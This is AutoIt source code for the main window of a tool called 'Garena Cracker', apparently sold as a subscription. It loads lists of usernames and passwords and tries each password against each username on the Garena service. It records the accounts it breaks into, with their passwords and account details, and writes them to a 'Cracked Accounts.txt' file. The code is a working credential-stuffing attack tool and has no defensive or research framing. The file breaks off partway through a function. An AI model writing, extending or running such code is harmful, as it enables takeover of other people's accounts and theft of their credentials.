#include-once
#AutoIt3Wrapper_Au3Check_Parameters=-q -d -w 1 -w 2 -w 3 -w 4 -w 5 -w 6 -w 7
#include '..\Header.au3'

Global $asUsernames[0]
Global $asPasswords[0]
Global $iLastCheckedUsername = 0

Global $iCracked = 0
Global $iNotCracked = 0
Global $iInvalidUsername = 0
Global $iCheckedUsernames = 0

Func Main()
	;---------------------------------------------------------------------------
	;
	Local $WIDTH = 595
	Local $HEIGHT = 450

	Local $hWnd = GUICreate($APP_NAME, $WIDTH + 2, $HEIGHT + 51, -1, -1, BitOR($WS_POPUP, $WS_MINIMIZEBOX), 0)
	GUISetBkColor(0xEFEFF2, $hWnd)
	GUISetFont(8.5, $FW_NORMAL, 0, 'Tahoma', $hWnd, $DEFAULT_QUALITY)
	GUISetOnEvent($GUI_EVENT_CLOSE, Main_btnClose_MouseClick)

	GUICtrlCreateLabel('', 0, 0, $WIDTH + 2, 1)
	GUICtrlSetBkColor(-1, 0xC9302C)

	GUICtrlCreateLabel('', $WIDTH + 1, 1, 1, $HEIGHT + 26)
	GUICtrlSetBkColor(-1, 0xC9302C)

	GUICtrlCreateLabel('', 0, $HEIGHT + 27, $WIDTH + 2, 24)
	GUICtrlSetBkColor(-1, 0xC9302C)

	GUICtrlCreateLabel('', 0, 1, 1, $HEIGHT + 26)
	GUICtrlSetBkColor(-1, 0xC9302C)

	GUICtrlCreatePicEx('ICON_PNG', 8, 8, 20, 16)

	GUICtrlCreateLabel($APP_NAME, 35, 1, $WIDTH - 136, 26 + 3, $SS_CENTERIMAGE, $GUI_WS_EX_PARENTDRAG)
	GUICtrlSetColor(-1, 0x717171)
	GUICtrlSetFont(-1, 12)

	GUICtrlCreateLabel('', $WIDTH - 33, 1, 34, 26)
	GUICtrlSetTip(-1, 'Close')
	GUICtrlSetMouseClick(-1, Main_btnClose_MouseClick)
	GUICtrlSetMouseDown(-1, Main_Button_MouseDown)
	GUICtrlSetMouseEnter(-1, Main_Button_MouseEnter)
	GUICtrlSetMouseLeave(-1, Main_Button_MouseLeave)
	GUICtrlSetMouseUp(-1, Main_Button_MouseUp)
	GUICtrlCreatePicEx('CLOSE_PNG', $WIDTH - 33, 1, 34, 26)

	GUICtrlCreateLabel('', $WIDTH - 67, 1, 34, 26)
	GUICtrlSetTip(-1, 'Minimize to Tray')
	GUICtrlSetMouseClick(-1, Main_btnMinimizeToTray_MouseClick)
	GUICtrlSetMouseDown(-1, Main_Button_MouseDown)
	GUICtrlSetMouseEnter(-1, Main_Button_MouseEnter)
	GUICtrlSetMouseLeave(-1, Main_Button_MouseLeave)
	GUICtrlSetMouseUp(-1, Main_Button_MouseUp)
	GUICtrlCreatePicEx('MINIMIZE_TO_TRAY_PNG', $WIDTH - 67, 1, 34, 26)

	GUICtrlCreateLabel('', $WIDTH - 101, 1, 34, 26)
	GUICtrlSetTip(-1, 'Minimize')
	GUICtrlSetMouseClick(-1, Main_btnMinimize_MouseClick)
	GUICtrlSetMouseDown(-1, Main_Button_MouseDown)
	GUICtrlSetMouseEnter(-1, Main_Button_MouseEnter)
	GUICtrlSetMouseLeave(-1, Main_Button_MouseLeave)
	GUICtrlSetMouseUp(-1, Main_Button_MouseUp)
	GUICtrlCreatePicEx('MINIMIZE_PNG', $WIDTH - 101, 1, 34, 26)

	Local $lblStatusBar = GUICtrlCreateLabel('Ready', 11, $HEIGHT + 28, $WIDTH - 270, 22, $SS_CENTERIMAGE)
	GUICtrlSetBkColor(-1, 0xC9302C)
	GUICtrlSetColor(-1, 0xFFFFFF)

	Local $lblExpiryDateReminder = GUICtrlCreateLabel('', $WIDTH - 309, $HEIGHT + 28, 300, 22, BitOR($SS_RIGHT, $SS_CENTERIMAGE))
	GUICtrlSetBkColor(-1, 0xC9302C)
	GUICtrlSetColor(-1, 0xFFFFFF)
	;
	;---------------------------------------------------------------------------

	;---------------------------------------------------------------------------
	;
	Local $avMenuItem = 0, $iNextMenuItemX = 2

	$avMenuItem = GetStringSize('    ' & 'FILE' & '    ', 8.5, $FW_NORMAL, 0, 'Tahoma')
	GUICtrlCreateLabel($avMenuItem[0], $iNextMenuItemX, 32, $avMenuItem[1], 16, BitOR($SS_CENTER, $SS_CENTERIMAGE))
	GUICtrlSetColor(-1, 0x1E1E1E)
	GUICtrlSetMouseDown(-1, Main_Menu_MouseDown)
	GUICtrlSetMouseEnter(-1, Main_Menu_MouseEnter)
	GUICtrlSetMouseLeave(-1, Main_Menu_MouseLeave)
	$iNextMenuItemX += $avMenuItem[1]

	Local $dumFile = GUICtrlCreateDummy()
	Local $mnuFile = GUICtrlCreateContextMenu($dumFile)
	GUICtrlCreateMenuItem('Load Username(s)' & @TAB & 'Ctrl+U', $mnuFile)
	GUICtrlSetOnEvent(-1, Main_mnuLoadUsernames_MouseClick)
	GUICtrlCreateMenuItem('Load Password(s)' & @TAB & 'Ctrl+P', $mnuFile)
	GUICtrlSetOnEvent(-1, Main_mnuLoadPasswords_MouseClick)
	GUICtrlCreateMenuItem('', $mnuFile)
	GUICtrlCreateMenuItem('Minimize to Tray', $mnuFile)
	GUICtrlSetOnEvent(-1, Main_btnMinimizeToTray_MouseClick)
	GUICtrlCreateMenuItem('Exit', $mnuFile)
	GUICtrlSetOnEvent(-1, Main_btnClose_MouseClick)

	$avMenuItem = GetStringSize('    ' & 'HELP' & '    ', 8.5, $FW_NORMAL, 0, 'Tahoma')
	GUICtrlCreateLabel($avMenuItem[0], $iNextMenuItemX, 32, $avMenuItem[1], 16, BitOR($SS_CENTER, $SS_CENTERIMAGE))
	GUICtrlSetColor(-1, 0x1E1E1E)
	GUICtrlSetMouseDown(-1, Main_Menu_MouseDown)
	GUICtrlSetMouseEnter(-1, Main_Menu_MouseEnter)
	GUICtrlSetMouseLeave(-1, Main_Menu_MouseLeave)
	$iNextMenuItemX += $avMenuItem[1]

	Local $dumHelp = GUICtrlCreateDummy()
	Local $mnuHelp = GUICtrlCreateContextMenu($dumHelp)
	GUICtrlCreateMenuItem('About ' & $APP_NAME, $mnuHelp)
	GUICtrlSetOnEvent(-1, Main_mnuAbout_MouseClick)
	;
	;---------------------------------------------------------------------------

	;---------------------------------------------------------------------------
	;
	GUICtrlCreatePicEx('TOOLBAR_STRIP_PNG', 11, 55, 5, 17)

	Local $avToolbarItem = 0, $iNextToolbarItemX = 21

	$avToolbarItem = GetStringSize('  ' & 'Save Cracked Accounts' & ' ', 8.5, $FW_NORMAL, 0, 'Tahoma')
	GUICtrlCreateLabel($avToolbarItem[0], $iNextToolbarItemX, 53, $avToolbarItem[1], 22, $SS_CENTERIMAGE)
	GUICtrlSetColor(-1, 0x1E1E1E)
	GUICtrlSetMouseClick(-1, Main_lblSaveCrackedAccounts_MouseClick)
	GUICtrlSetMouseDown(-1, Main_ToolbarItem_MouseDown)
	GUICtrlSetMouseEnter(-1, Main_ToolbarItem_MouseEnter)
	GUICtrlSetMouseLeave(-1, Main_ToolbarItem_MouseLeave)
	GUICtrlSetMouseUp(-1, Main_ToolbarItem_MouseUp)
	$iNextToolbarItemX += $avToolbarItem[1] + 5

	GUICtrlCreatePicEx('TOOLBAR_SEPARATOR_PNG', $iNextToolbarItemX, 53 + 1, 2, 20)
	$iNextToolbarItemX += 2 + 5

	$avToolbarItem = GetStringSize('  ' & 'Save Not Cracked Accounts' & ' ', 8.5, $FW_NORMAL, 0, 'Tahoma')
	GUICtrlCreateLabel($avToolbarItem[0], $iNextToolbarItemX, 53, $avToolbarItem[1], 22, $SS_CENTERIMAGE)
	GUICtrlSetColor(-1, 0x1E1E1E)
	GUICtrlSetMouseClick(-1, Main_lblSaveNotCrackedAccounts_MouseClick)
	GUICtrlSetMouseDown(-1, Main_ToolbarItem_MouseDown)
	GUICtrlSetMouseEnter(-1, Main_ToolbarItem_MouseEnter)
	GUICtrlSetMouseLeave(-1, Main_ToolbarItem_MouseLeave)
	GUICtrlSetMouseUp(-1, Main_ToolbarItem_MouseUp)
	$iNextToolbarItemX += $avToolbarItem[1] + 5

	GUICtrlCreatePicEx('TOOLBAR_SEPARATOR_PNG', $iNextToolbarItemX, 53 + 1, 2, 20)
	$iNextToolbarItemX += 2 + 5

	$avToolbarItem = GetStringSize('  ' & 'Save Invalid Usernames' & ' ', 8.5, $FW_NORMAL, 0, 'Tahoma')
	GUICtrlCreateLabel($avToolbarItem[0], $iNextToolbarItemX, 53, $avToolbarItem[1], 22, $SS_CENTERIMAGE)
	GUICtrlSetColor(-1, 0x1E1E1E)
	GUICtrlSetMouseClick(-1, Main_lblSaveInvalidUsernames_MouseClick)
	GUICtrlSetMouseDown(-1, Main_ToolbarItem_MouseDown)
	GUICtrlSetMouseEnter(-1, Main_ToolbarItem_MouseEnter)
	GUICtrlSetMouseLeave(-1, Main_ToolbarItem_MouseLeave)
	GUICtrlSetMouseUp(-1, Main_ToolbarItem_MouseUp)
	$iNextToolbarItemX += $avToolbarItem[1] + 5
	;
	;---------------------------------------------------------------------------

	;---------------------------------------------------------------------------
	;
	Local $lblCracked = GUICtrlCreateLabel('Cracked Accounts : 0', 11, 85, 325, 17)
	GUICtrlSetColor(-1, 0x007F00)

	Local $lvwCracked = GUICtrlCreateListView('', 11, 105, 575, 150, BitOR($LVS_NOSORTHEADER, $LVS_SINGLESEL, $LVS_SHOWSELALWAYS), BitOR($LVS_EX_FULLROWSELECT, $LVS_EX_INFOTIP, $WS_EX_CLIENTEDGE))
	If @OSBuild >= 6000 Then
		_WinAPI_SetWindowTheme(GUICtrlGetHandle($lvwCracked), 'Explorer')
	EndIf

	_GUICtrlListView_AddColumn($lvwCracked, 'UID', 75)
	_GUICtrlListView_AddColumn($lvwCracked, 'Username', 150)
	_GUICtrlListView_AddColumn($lvwCracked, 'Password', 150)
	_GUICtrlListView_AddColumn($lvwCracked, 'Level', 50)
	_GUICtrlListView_AddColumn($lvwCracked, 'Shell', 50)
	_GUICtrlListView_AddColumn($lvwCracked, 'Rename', 75)

	Local $lblNotCracked = GUICtrlCreateLabel('Not Cracked Accounts : 0', 11, 265, 200, 17)
	GUICtrlSetColor(-1, 0xFF8800)

	Local $lvwNotCracked = GUICtrlCreateListView('', 11, 285, 280, 150, BitOR($LVS_NOSORTHEADER, $LVS_SINGLESEL, $LVS_SHOWSELALWAYS), BitOR($LVS_EX_FULLROWSELECT, $LVS_EX_INFOTIP, $WS_EX_CLIENTEDGE))
	If @OSBuild >= 6000 Then
		_WinAPI_SetWindowTheme(GUICtrlGetHandle($lvwNotCracked), 'Explorer')
	EndIf

	_GUICtrlListView_AddColumn($lvwNotCracked, 'Username', 220)

	Local $lblInvalidUsername = GUICtrlCreateLabel('Invalid Usernames : 0', 306, 265, 175, 17)
	GUICtrlSetColor(-1, 0xF70000)

	Local $lvwInvalidUsername = GUICtrlCreateListView('', 306, 285, 280, 150, BitOR($LVS_NOSORTHEADER, $LVS_SINGLESEL, $LVS_SHOWSELALWAYS), BitOR($LVS_EX_FULLROWSELECT, $LVS_EX_INFOTIP, $WS_EX_CLIENTEDGE))
	If @OSBuild >= 6000 Then
		_WinAPI_SetWindowTheme(GUICtrlGetHandle($lvwInvalidUsername), 'Explorer')
	EndIf

	_GUICtrlListView_AddColumn($lvwInvalidUsername, 'Username', 220)

	Local $btnPause = GUICtrlCreateButton('Pause', 487, 444, 100, 24)
	GUICtrlSetState(-1, $GUI_HIDE)

	Local $btnStart = GUICtrlCreateButton('Start', 487, 444, 100, 24)
	GUICtrlSetOnEvent(-1, Main_btnStart_MouseClick)

	Local $btnReset = GUICtrlCreateButton('Reset', 379, 444, 100, 24)
	GUICtrlSetOnEvent(-1, Main_btnReset_MouseClick)
	;
	;---------------------------------------------------------------------------

	;---------------------------------------------------------------------------
	;
	Local $keyLoadUsernames = GUICtrlCreateDummy()
	GUICtrlSetOnEvent(-1, Main_mnuLoadUsernames_MouseClick)

	Local $keyLoadPasswords = GUICtrlCreateDummy()
	GUICtrlSetOnEvent(-1, Main_mnuLoadPasswords_MouseClick)

	Local $avAccelerators[][] = [ _
			['^u', $keyLoadUsernames], _
			['^p', $keyLoadPasswords]]
	GUISetAccelerators($avAccelerators, $hWnd)

	Local $oCheckInTimer = Timer(Main_CheckIn, $TIME_25_MINUTES)
	If @error Then
		Debug('Main.form | Timer() failed.', @ScriptLineNumber)
	EndIf
	;
	;---------------------------------------------------------------------------

	;---------------------------------------------------------------------------
	;
	Local $oClass = AutoItObject_Class()
	With $oClass
		; --- Destructor
		.AddDestructor('Main_Destructor')

		; --- Properties | Read-only
		.AddProperty('Handle', $ELSCOPE_READONLY, $hWnd)
		.AddProperty('lblStatusBar', $ELSCOPE_READONLY, $lblStatusBar)
		.AddProperty('lblExpiryDateReminder', $ELSCOPE_READONLY, $lblExpiryDateReminder)
		.AddProperty('lblCracked', $ELSCOPE_READONLY, $lblCracked)
		.AddProperty('lvwCracked', $ELSCOPE_READONLY, $lvwCracked)
		.AddProperty('lblNotCracked', $ELSCOPE_READONLY, $lblNotCracked)
		.AddProperty('lvwNotCracked', $ELSCOPE_READONLY, $lvwNotCracked)
		.AddProperty('lblInvalidUsername', $ELSCOPE_READONLY, $lblInvalidUsername)
		.AddProperty('lvwInvalidUsername', $ELSCOPE_READONLY, $lvwInvalidUsername)
		.AddProperty('btnPause', $ELSCOPE_READONLY, $btnPause)
		.AddProperty('btnStart', $ELSCOPE_READONLY, $btnStart)
		.AddProperty('btnReset', $ELSCOPE_READONLY, $btnReset)
		.AddProperty('CheckInTimer', $ELSCOPE_READONLY, $oCheckInTimer)

		; --- Methods | Public
		.AddMethod('Status', 'Main_Status', False)
		.AddMethod('ExpiryDateReminder', 'Main_ExpiryDateReminder', False)
	EndWith
	Local $this = $oClass.Object
	;
	;---------------------------------------------------------------------------

	;---------------------------------------------------------------------------
	;
	$this.ExpiryDateReminder()

	GUIRegisterMsg($WM_COMMAND, Main_WM_COMMAND)

	GUISetState(@SW_SHOW, $hWnd)
	$frmLogin = Null

	Return $this
	;
	;---------------------------------------------------------------------------
EndFunc

Func Main_Destructor($this)
	$this.CheckInTimer.Enabled = False
	GUIUnsetMouseEvents($this.Handle)
	GUIDelete($this.Handle)
	Exit
EndFunc

Func Main_Button_MouseDown($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xC9302C)
EndFunc

Func Main_Button_MouseEnter($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xFEFEFE)
EndFunc

Func Main_Button_MouseLeave($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xEFEFF2)
EndFunc

Func Main_Button_MouseUp($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xFEFEFE)
EndFunc

Func Main_btnClose_MouseClick()
	$frmMain.Status('Logging out...')

	Local $iRetryCount = 1
	While True
		If $oServer.Logout() = $oServer.Result['Valid'] Then
			ExitLoop
		EndIf

		If $iRetryCount < 5 Then
			Sleep($iRetryCount * 1000)
			$iRetryCount += 1
		Else
			ExitLoop
		EndIf
	WEnd

	$frmMain = Null
EndFunc

Func Main_btnMinimizeToTray_MouseClick()
	GUISetState(@SW_HIDE, $frmMain.Handle)
	Opt('TrayIconHide', 0)

	TraySetToolTip($APP_NAME)
	TraySetOnEvent($TRAY_EVENT_PRIMARYDOWN, Main_TrayIcon_MouseClick)
EndFunc

Func Main_btnMinimize_MouseClick()
	GUISetState(@SW_MINIMIZE, $frmMain.Handle)
EndFunc

Func Main_TrayIcon_MouseClick()
	Opt('TrayIconHide', 1)
	GUISetState(@SW_SHOW, $frmMain.Handle)

	TraySetOnEvent($TRAY_EVENT_PRIMARYDOWN, Null)
EndFunc

Func Main_Menu_MouseDown($mParam)
	Local $aiCtrlPos = ControlGetPos($mParam['hWnd'], '', $mParam['Id'])

	Local $tPoint = DllStructCreate($tagPOINT)
	$tPoint.X = $aiCtrlPos[0]
	$tPoint.Y = $aiCtrlPos[1] + $aiCtrlPos[3]

	_WinAPI_ClientToScreen($mParam['hWnd'], $tPoint)

	DllCall('user32.dll', 'BOOL', 'TrackPopupMenuEx', _
			'HANDLE', GUICtrlGetHandle($mParam['Id'] + 2), _
			'UINT', 0, _
			'INT', $tPoint.X, _
			'INT', $tPoint.Y, _
			'HWND', $mParam['hWnd'], _
			'PTR', 0)
EndFunc

Func Main_Menu_MouseEnter($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xFEFEFE)
EndFunc

Func Main_Menu_MouseLeave($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xEFEFF2)
EndFunc

Func Main_mnuLoadUsernames_MouseClick()
	Local $sWorkingDir = @WorkingDir

	Local $sFilePath = FileOpenDialog('Usernames', @ScriptDir, 'Text files (*.txt)', BitOR($FD_FILEMUSTEXIST, $FD_PATHMUSTEXIST), '', $frmMain.Handle)
	If @error Then
		Return
	EndIf

	FileChangeDir($sWorkingDir)

	Local $asLines = FileReadToArray($sFilePath)
	Switch @error
		Case 1
			$oMessage.Error('Error opening specified file.', $frmMain)
			Return

		Case 2
			$oMessage.Warning('Empty file.', $frmMain)
			Return
	EndSwitch

	$oUsernames.RemoveAll()

	For $sLine In $asLines
		$sLine = StringStripWS($sLine, $STR_STRIPALL)

		If $sLine And StringLen($sLine) < 17 Then
			If $oUsernames.Exists($sLine) Then
				ContinueLoop
			EndIf
		Else
			ContinueLoop
		EndIf

		$oUsernames.Add($sLine, '')
	Next

	$asUsernames = $oUsernames.Keys()
	$iLastCheckedUsername = 0

	$oMessage.Information($oUsernames.Count & ' username(s) loaded.', $frmMain)
EndFunc

Func Main_mnuLoadPasswords_MouseClick()
	Local $sWorkingDir = @WorkingDir

	Local $sFilePath = FileOpenDialog('Passwords', @ScriptDir, 'Text files (*.txt)', BitOR($FD_FILEMUSTEXIST, $FD_PATHMUSTEXIST), '', $frmMain.Handle)
	If @error Then
		Return
	EndIf

	FileChangeDir($sWorkingDir)

	Local $asLines = FileReadToArray($sFilePath)
	Switch @error
		Case 1
			$oMessage.Error('Error opening specified file.', $frmMain)
			Return

		Case 2
			$oMessage.Warning('Empty file.', $frmMain)
			Return
	EndSwitch

	$oPasswords.RemoveAll()

	For $sLine In $asLines
		$sLine = StringStripWS($sLine, BitOR($STR_STRIPLEADING, $STR_STRIPTRAILING))

		If $sLine Then
			If $oPasswords.Exists($sLine) Then
				ContinueLoop
			EndIf
		Else
			ContinueLoop
		EndIf

		$oPasswords.Add($sLine, '')
	Next

	$asPasswords = $oPasswords.Keys()

	$oMessage.Information($oPasswords.Count & ' password(s) loaded.', $frmMain)
EndFunc

Func Main_mnuAbout_MouseClick()
	$frmAbout = About()
EndFunc

Func Main_ToolbarItem_MouseDown($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xC9302C)
	GUICtrlSetColor($mParam['Id'], 0xFFFFFF)
EndFunc

Func Main_ToolbarItem_MouseEnter($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xFEFEFE)
EndFunc

Func Main_ToolbarItem_MouseLeave($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xEFEFF2)
	GUICtrlSetColor($mParam['Id'], 0x1E1E1E)
EndFunc

Func Main_ToolbarItem_MouseUp($mParam)
	GUICtrlSetBkColor($mParam['Id'], 0xFEFEFE)
	GUICtrlSetColor($mParam['Id'], 0x1E1E1E)
EndFunc

Func Main_lblSaveCrackedAccounts_MouseClick()
	Local $iItemCount = _GUICtrlListView_GetItemCount($frmMain.lvwCracked)
	If $iItemCount Then
		; --- Nothing to do
	Else
		$oMessage.Warning('List is empty.', $frmMain)
		Return
	EndIf

	Local $sWorkingDir = @WorkingDir

	Local $sFilePath = FileSaveDialog('Cracked Accounts', @ScriptDir, 'Text files (*.txt)', BitOR($FD_PATHMUSTEXIST, $FD_PROMPTOVERWRITE), '*.txt', $frmMain.Handle)
	If @error Then
		Return
	EndIf

	FileChangeDir($sWorkingDir)

	Local $hFile = FileOpen($sFilePath, $FO_OVERWRITE)
	If $hFile = -1 Then
		$oMessage.Error('Unable to open file.', $frmMain)
		Return
	EndIf

	FileClose($hFile)

	$hFile = FileOpen($sFilePath, $FO_APPEND)

	Local $sUid, $sUsername, $sPassword, $sLevel, $sShell, $sRename
	For $i = 0 To $iItemCount - 1
		$sUid = _GUICtrlListView_GetItemText($frmMain.lvwCracked, $i, 0)
		$sUsername = _GUICtrlListView_GetItemText($frmMain.lvwCracked, $i, 1)
		$sPassword = _GUICtrlListView_GetItemText($frmMain.lvwCracked, $i, 2)
		$sLevel = _GUICtrlListView_GetItemText($frmMain.lvwCracked, $i, 3)
		$sShell = _GUICtrlListView_GetItemText($frmMain.lvwCracked, $i, 4)
		$sRename = _GUICtrlListView_GetItemText($frmMain.lvwCracked, $i, 5)

		FileWrite($hFile, StringFormat('%s : %s : %s : %s : %s : %s%s', $sUid, $sUsername, $sPassword, $sLevel, $sShell, $sRename, @CRLF))
	Next

	FileClose($hFile)

	$oMessage.Information('File successfully saved.', $frmMain)
EndFunc

Func Main_lblSaveNotCrackedAccounts_MouseClick()
	Local $iItemCount = _GUICtrlListView_GetItemCount($frmMain.lvwNotCracked)
	If $iItemCount Then
		; --- Nothing to do
	Else
		$oMessage.Warning('List is empty.', $frmMain)
		Return
	EndIf

	Local $sWorkingDir = @WorkingDir

	Local $sFilePath = FileSaveDialog('Not Cracked Accounts', @ScriptDir, 'Text files (*.txt)', BitOR($FD_PATHMUSTEXIST, $FD_PROMPTOVERWRITE), '*.txt', $frmMain.Handle)
	If @error Then
		Return
	EndIf

	FileChangeDir($sWorkingDir)

	Local $hFile = FileOpen($sFilePath, $FO_OVERWRITE)
	If $hFile = -1 Then
		$oMessage.Error('Unable to open file.', $frmMain)
		Return
	EndIf

	FileClose($hFile)

	$hFile = FileOpen($sFilePath, $FO_APPEND)

	Local $sUsername = ''
	For $i = 0 To $iItemCount - 1
		$sUsername = _GUICtrlListView_GetItemText($frmMain.lvwNotCracked, $i, 0)

		FileWrite($hFile, $sUsername & @CRLF)
	Next

	FileClose($hFile)

	$oMessage.Information('File successfully saved.', $frmMain)
EndFunc

Func Main_lblSaveInvalidUsernames_MouseClick()
	Local $iItemCount = _GUICtrlListView_GetItemCount($frmMain.lvwInvalidUsername)
	If $iItemCount Then
		; --- Nothing to do
	Else
		$oMessage.Warning('List is empty.', $frmMain)
		Return
	EndIf

	Local $sWorkingDir = @WorkingDir

	Local $sFilePath = FileSaveDialog('Invalid Usernames', @ScriptDir, 'Text files (*.txt)', BitOR($FD_PATHMUSTEXIST, $FD_PROMPTOVERWRITE), '*.txt', $frmMain.Handle)
	If @error Then
		Return
	EndIf

	FileChangeDir($sWorkingDir)

	Local $hFile = FileOpen($sFilePath, $FO_OVERWRITE)
	If $hFile = -1 Then
		$oMessage.Error('Unable to open file.', $frmMain)
		Return
	EndIf

	FileClose($hFile)

	$hFile = FileOpen($sFilePath, $FO_APPEND)

	Local $sUsername = ''
	For $i = 0 To $iItemCount - 1
		$sUsername = _GUICtrlListView_GetItemText($frmMain.lvwInvalidUsername, $i, 0)

		FileWrite($hFile, $sUsername & @CRLF)
	Next

	FileClose($hFile)

	$oMessage.Information('File successfully saved.', $frmMain)
EndFunc

Func Main_btnStart_MouseClick()
	If $oUsernames.Count And $oPasswords.Count Then
		; --- Nothing to do
	Else
		$oMessage.Warning('Please provide both username and password list.', $frmMain)
		Return
	EndIf

	GUICtrlSetState($frmMain.btnStart, $GUI_HIDE)
	GUICtrlSetState($frmMain.btnPause, $GUI_SHOW)
	GUICtrlSetState($frmMain.btnReset, $GUI_DISABLE)
	$bInterrupted = False

	Local $mInfo = []

	For $i = $iLastCheckedUsername To UBound($asUsernames) - 1
		$iCheckedUsernames += 1
		$frmMain.Status(StringFormat('Cracking %u/%u (%s)', $iCheckedUsernames, $oUsernames.Count, $asUsernames[$i]))

		For $j = 0 To UBound($asPasswords) - 1
			Switch Check($asUsernames[$i], $oLibraries.MD5($asPasswords[$j]))
				Case $GTP_CRACKED
					$iCracked += 1
					GUICtrlSetData($frmMain.lblCracked, 'Cracked Accounts : ' & $iCracked)

					$mInfo = GetAccountInfo($asUsernames[$i], $asPasswords[$j])
					If IsMap($mInfo) Then
						FileWrite(@ScriptDir & '\Cracked Accounts.txt', StringFormat('%s : %s : %s : %s : %s : %s%s', $mInfo['UID'], $mInfo['Username'], $mInfo['Password'], $mInfo['Level'], $mInfo['Shell'], $mInfo['Rename'], @CRLF))

						GUICtrlCreateListViewItem(StringFormat('%s½%s½%s½%s½%s½%s', $mInfo['UID'], $mInfo['Username'], $mInfo['Password'], $mInfo['Level'], $mInfo['Shell'], $mInfo['Rename']), $frmMain.lvwCracked)
					Else
						GUICtrlCreateListViewItem(StringFormat('-½%s½%s½-½-½-', $asUsernames[$i], $asPasswords[$j]), $frmMain.lvwCracked)
					EndIf

					ContinueLoop 2

				Case $GTP_INVALID_USERNAME
					$iInvalidUsername += 1
					GUICtrlSetData($frmMain.lblInvalidUsername, 'Invalid Usernames : ' & $iInvalidUsername)
					GUICtrlCreateListViewItem($asUsernames[$i], $frmMain.lvwInvalidUsername)
					ContinueLoop 2

				Case $GTP_INTERRUPTED
					$iCheckedUsernames -= 1
					$frmMain.Status('Paused')

					$iLastCheckedUsername = $i
					Return

;~ 				Case $GTP_WRONG_PASSWORD
;~ 				Case $GTP_UNKNOWN
;~ 				Case $GTP_FAILED
			EndSwitch
		Next

		$iNotCracked += 1
		GUICtrlSetData($frmMain.lblNotCracked, 'Not Cracked Accounts : ' & $iNotCracked)
		GUICtrlCreateListViewItem($asUsernames[$i], $frmMain.lvwNotCracked)
	Next

	GUICtrlSetState($frmMain.btnPause, $GUI_HIDE)
	GUICtrlSetData($frmMain.btnStart, 'Start')
	GUICtrlSetState($frmMain.btnStart, $GUI_SHOW)
	GUICtrlSetState($frmMain.btnReset, $GUI_ENABLE)

	$iCracked = 0
	$iNotCracked = 0
	$iInvalidUsername = 0
	$iCheckedUsernames = 0
	$iLastCheckedUsername = 0

	$frmMain.Status('Ready')
	$oMessage.Information('Cracking successfully finished.', $frmMain)
EndFunc

Func Main_btnReset_MouseClick()
;~ 	$oUsernames.RemoveAll()
;~ 	$oPasswords.RemoveAll()

	$iCracked = 0
	$iNotCracked = 0
	$iInvalidUsername = 0
	$iCheckedUsernames = 0
	$iLastCheckedUsername = 0

	GUICtrlSetData($frmMain.lblCracked, 'Cracked Accounts : ' & $iCracked)
	GUICtrlSetData($frmMain.lblNotCracked, 'Not Cracked Accounts : ' & $iNotCracked)
	GUICtrlSetData($frmMain.lblInvalidUsername, 'Invalid Usernames : ' & $iInvalidUsername)

	_GUICtrlListView_DeleteAllItems($frmMain.lvwCracked)
	_GUICtrlListView_DeleteAllItems($frmMain.lvwNotCracked)
	_GUICtrlListView_DeleteAllItems($frmMain.lvwInvalidUsername)

	GUICtrlSetData($frmMain.btnStart, 'Start')
	$frmMain.Status('Ready')
EndFunc

Func Main_WM_COMMAND($hWnd, $uMsg, $wParam, $lParam)
	#forceref $hWnd, $uMsg, $lParam

	Local $iCode = BitShift($wParam, 16)
	Local $iCtrlId = BitAND($wParam, 0x0000FFFF)

	If $iCode = $BN_CLICKED And $iCtrlId = $frmMain.btnPause Then
		Main_Pause()
	EndIf

	Return $GUI_RUNDEFMSG
EndFunc

Func Main_Pause()
	GUICtrlSetState($frmMain.btnPause, $GUI_HIDE)
	GUICtrlSetData($frmMain.btnStart, 'Resume')
	GUICtrlSetState($frmMain.btnStart, $GUI_SHOW)
	GUICtrlSetState($frmMain.btnReset, $GUI_ENABLE)

	$bInterrupted = True
EndFunc

Func Main_Status($this, $sStatus)
	GUICtrlSetData($this.lblStatusBar, $sStatus)
EndFunc

Func Main_ExpiryDateReminder($this)
	Local $sMessage = ''

	If $oServer.RemainingDays >= 7 Then
		$sMessage = StringFormat('%u days remaining of your %s account', $oServer.RemainingDays, $APP_NAME)
	ElseIf $oServer.RemainingDays < 7 Then
		If $oServer.RemainingDays Then
			$sMessage = StringFormat('Your %s account will expire in %u days', $APP_NAME, $oServer.RemainingDays)
		Else
			$sMessage = StringFormat('Your %s account will expire soon', $APP_NAME)
		EndIf
	EndIf

	GUICtrlSetData($this.lblExpiryDateReminder, $sMessage)
EndFunc

Func Main_CheckIn($hWnd, $uMsg, $uTimerId, $dwTime)
	#forceref $hWnd, $uMsg, $uTimerId, $dwTime

	Local Static $iRetryCount = 0

	$frmMain.CheckInTimer.Enabled = False

	Local $iResult = $oServer.CheckIn()

	Local $sTime = StringFormat('\n\n%s-%s-%s %s:%s:%s', @YEAR, @MON, @MDAY, @HOUR, @MIN, @SEC)
	Switch $iResult
		Case $oServer.Result['Valid']
			$frmMain.ExpiryDateReminder()
			$iRetryCount = 0
			$frmMain.CheckInTimer.Enabled = True
			Return

		Case $oServer.Result['Invalid']
			$oSettings.Username = ''
			$oSettings.Password = ''
			$oMessage.Error('Sorry, we have to close Garena Cracker.' & @CRLF & 'Your password has been changed.' & $sTime)

		Case $oServer.Result['Expired']
			$oMessage.Error('Sorry, we have to close Garena Cracker.' & @CRLF & 'Your account has expired.' & $sTime)

		Case $oServer.Result['Locked']
			$oMessage.Error('Sorry, we have to close Garena Cracker.' & @CRLF & 'Your account has been locked.' & $sTime)

		Case $oServer.Result['Limit']
			$oMessage.Error('Sorry, we have to close Garena Cracker.' & @CRLF & 'Your account has reached its online users limit.' & $sTime)

		Case Else
			$iRetryCount += 1
			If $iRetryCount = 10 Then
				$oMessage.Error('Check in failed.' & @CRLF & 'Unable to connect to server.' & $sTime)
			Else
				Sleep(5000)
				Main_CheckIn($hWnd, $uMsg, $uTimerId, $dwTime)
				Return
			EndIf
	EndSwitch

	$frmMain = 0
EndFunc

Func GetAccountInfo($sUsername, $sPassword)
	Local $sRsa = GetPasswordRsa($sPassword)
	If Not $sRsa Then
		Return ''
	EndIf

